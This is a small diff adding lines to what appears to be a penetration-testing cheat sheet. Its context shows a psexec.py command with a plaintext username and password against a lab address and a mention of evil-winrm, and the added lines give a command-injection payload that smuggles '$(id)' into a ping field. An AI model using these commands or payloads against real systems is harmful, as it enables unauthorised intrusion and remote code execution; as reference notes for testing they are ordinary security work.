@@ -136,3 +136,7 @@ connection with tool evilwinrm
 
 #Execute processes on other systems
 psexec.py pentest:'P3nT3st!'@10.10.10.152
+
+#Command injection (ping)
+1.1.1.1 "$(id)"  
+
